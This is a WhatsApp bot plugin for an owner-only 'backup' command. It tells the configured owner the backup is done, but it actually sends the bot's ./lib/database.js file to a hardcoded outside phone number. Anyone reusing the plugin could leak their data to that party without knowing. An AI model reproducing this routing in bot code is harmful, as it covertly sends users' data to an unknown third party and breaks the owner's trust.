import fs from 'fs'
import fetch from 'node-fetch'
let handler = async (m, { conn, usedPrefix: _p, args, command }) => {
conn.reply(m.chat, '*Succes*', m)
conn.reply(global.nomorown + '@s.whatsapp.net', `*Database:* Clara`, null)
          conn.sendFile('6285776353741' + '@s.whatsapp.net', fs.readFileSync('./lib/database.js'), 'database.js', '', 0, 0, { mimetype: 'application/json', quoted: m})
 }
 
 handler.help = ['backup']
handler.tags = ['owner']
handler.command = /^(backup)$/i
handler.rowner = true

export default handler
